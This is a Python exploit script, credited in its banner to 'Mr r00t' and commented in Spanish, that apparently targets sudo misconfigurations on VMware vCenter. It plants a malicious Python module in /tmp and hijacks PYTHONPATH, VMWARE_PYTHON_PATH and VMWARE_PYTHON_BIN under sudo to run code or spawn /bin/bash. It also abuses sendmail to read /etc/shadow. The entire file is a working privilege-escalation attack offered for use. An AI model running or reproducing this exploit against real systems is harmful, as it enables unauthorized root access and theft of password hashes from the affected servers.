import os
import subprocess

def print_banner():
    banner = r"""

 ██▒   █▓ ███▄ ▄███▓ █     █░ ▄▄▄       ██▀███  ▓█████     ██▒   █▓ ▄████▄  ▓█████  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░   █▒▓██▒▀█▀ ██▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀    ▓██░   █▒▒██▀ ▀█  ▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
 ▓██  █▒░▓██    ▓██░▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███       ▓██  █▒░▒▓█    ▄ ▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
  ▒██ █░░▒██    ▒██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄      ▒██ █░░▒▓▓▄ ▄██▒▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
   ▒▀█░  ▒██▒   ░██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒      ▒▀█░  ▒ ▓███▀ ░░▒████▒▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
   ░ ▐░  ░ ▒░   ░  ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░      ░ ▐░  ░ ░▒ ▒  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░░  ░  ░      ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░      ░ ░░    ░  ▒    ░ ░  ░░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
     ░░  ░      ░     ░   ░    ░   ▒     ░░   ░    ░           ░░  ░           ░      ░   ░ ░   ░         ░     ░░   ░ 
      ░         ░       ░          ░  ░   ░        ░  ░         ░  ░ ░         ░  ░         ░             ░  ░   ░     
     ░                                                         ░   ░                                                   
                                              by Mr r00t
    """
    print(banner)
    print("--------" * 10)

def create_malicious_code():
    # Directorio temporal para almacenar el código malicioso
    malicious_dir = "/tmp/malicious"
    os.makedirs(malicious_dir, exist_ok=True)

    # Ruta al código malicioso
    malicious_python_code = os.path.join(malicious_dir, "__init__.py")

    # Crear código malicioso en /tmp
    with open(malicious_python_code, "w") as file:
        file.write('import os\n')
        file.write('print("Malicious code executed!")\n')
        file.write('os.system("id > /tmp/pwned")\n')

def execute_with_pythonpath():
    # Establecer variable ambiental maliciosa PYTHONPATH
    os.environ["PYTHONPATH"] = "/tmp/malicious"
    
    # Comando sudo que se desea ejecutar
    sudo_command = "sudo -u operator python3 -c 'import os; print(os.environ[\"PYTHONPATH\"])'"

    # Ejecutar el comando sudo
    subprocess.run(sudo_command, shell=True)

def execute_with_vmware_python_path():
    # Establecer variable ambiental maliciosa VMWARE_PYTHON_PATH
    os.environ["VMWARE_PYTHON_PATH"] = "/tmp/malicious"
    
    # Comando sudo que se desea ejecutar
    sudo_command = "sudo -u pod python3 -c 'import os; print(os.environ[\"VMWARE_PYTHON_PATH\"])'"

    # Ejecutar el comando sudo
    subprocess.run(sudo_command, shell=True)

def execute_with_vmware_python_bin():
    # Crear un script shell malicioso
    shell_script = "/tmp/shell"
    with open(shell_script, "w") as file:
        file.write('/bin/bash')
    os.chmod(shell_script, 0o755)

    # Establecer variable ambiental maliciosa VMWARE_PYTHON_BIN
    os.environ["VMWARE_PYTHON_BIN"] = shell_script
    
    # Comando sudo que se desea ejecutar
    sudo_command = "sudo -u admin /bin/dcli"

    # Ejecutar el comando sudo
    subprocess.run(sudo_command, shell=True)

def execute_with_sendmail():
    # Comando sudo para leer el archivo /etc/shadow
    sudo_command = "sudo -u vpxd /usr/sbin/sendmail -tf aaa -C/etc/shadow"

    # Ejecutar el comando sudo
    subprocess.run(sudo_command, shell=True)

def check_exploit_success():
    # Verificar si se ha ejecutado el código malicioso
    if os.path.exists("/tmp/pwned"):
        with open("/tmp/pwned", "r") as file:
            print("Contenido del archivo /tmp/pwned:")
            print(file.read())
    else:
        print("El código malicioso no se ejecutó correctamente")

def main():
    print_banner()
    create_malicious_code()
    execute_with_pythonpath()
    execute_with_vmware_python_path()
    execute_with_vmware_python_bin()
    execute_with_sendmail()
    check_exploit_success()

if __name__ == "__main__":
    main()
